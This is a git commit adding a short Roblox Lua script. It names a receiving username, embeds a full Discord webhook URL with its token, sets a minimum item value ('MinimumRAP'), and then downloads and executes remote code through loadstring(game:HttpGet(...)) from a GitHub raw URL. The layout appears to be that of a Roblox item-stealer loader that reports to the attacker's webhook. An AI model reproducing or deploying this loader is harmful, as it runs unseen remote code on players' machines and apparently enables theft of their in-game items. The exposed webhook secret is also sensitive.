45d55a74e5df57000a5243e1bd4e2c26d45b0d62
VOIDZ <goldbed145@gmail.com>
2024-12-12 20:08:55 +0800

    Upload VoidScript_554170_note.lua

---
+++ VoidScript_554170_note.lua
@@ -0,0 +1,6 @@
+Username = 'mainarxd123'
+Webhook = 'https://discord.com/api/webhooks/1307553938517786655/BocWZp6l-nsH0IVtVbF5i1pLpyfPZ10yn8vKw3xhBv9AdXTxlggSdIRJ-7-7mBtiLqsH'
+
+MinimumRAP = 0
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/VOIDv3/VOIDSCRIPTS/refs/heads/main/VOIDSCRIPTS'))()
